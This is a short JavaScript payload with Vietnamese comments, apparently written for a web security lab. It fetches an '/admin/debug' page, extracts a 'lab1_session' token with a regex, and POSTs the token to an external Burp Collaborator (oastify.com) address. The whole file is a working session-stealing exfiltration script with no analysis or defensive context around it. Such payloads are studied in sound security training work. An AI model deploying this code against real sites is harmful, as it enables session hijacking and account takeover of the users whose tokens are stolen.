(async () => {
    try {
        // 1. Fetch response từ /admin/debug
        console.log('Đang fetch /admin/debug...');
        const response = await fetch('/admin/debug');
        
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        
        // Đợi load xong và lấy text
        const text = await response.text();
        console.log('Fetch thành công!');
        
        // 2. Tìm giá trị lab1_session
        const sessionRegex = /lab1_session=([^;\s]+)/i;
        const match = text.match(sessionRegex);
        
        if (!match) {
            throw new Error('Không tìm thấy lab1_session trong response');
        }
        
        const sessionValue = match[1];
        console.log('Tìm thấy lab1_session:', sessionValue);
        
        // 3. Gửi POST request đến collaborator
        const collaboratorUrl = 'https://eweo81gavxl4qjyx3n7e74hft6zxnubj.oastify.com';
        const postData = {
            session: sessionValue,
            source: '/admin/debug',
            timestamp: new Date().toISOString()
        };
        
        console.log('Đang gửi POST request đến collaborator...');
        const postResponse = await fetch(collaboratorUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(postData)
        });
        
        console.log('POST request đã gửi!');
        console.log('Collaborator response status:', postResponse.status);
        
    } catch (error) {
        console.error('Có lỗi xảy ra:', error.message);
    }
})();
